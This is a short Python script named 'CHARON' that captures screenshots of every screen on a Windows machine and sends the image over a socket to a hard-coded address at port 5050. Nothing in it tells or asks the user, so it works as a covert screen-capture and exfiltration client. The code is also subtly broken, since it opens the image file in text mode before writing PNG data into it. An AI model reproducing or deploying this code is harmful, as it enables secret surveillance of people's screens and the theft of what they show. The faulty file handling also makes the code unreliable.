#CHARON :
# simple client socket program for take screenshot from windows and send it to server

from PIL import ImageGrab
import socket

s = socket.socket()
s.connect(("192.168.1.115",5050))

file = open('screen.png', 'w')

screenshot = ImageGrab.grab(all_screens=True)
screenshot.save(file, 'PNG')

file.close()

f = open ('screen.png', "rb")
l = f.read(1024)

while (l):
    s.send(l)
    l = f.read(1024)

s.close()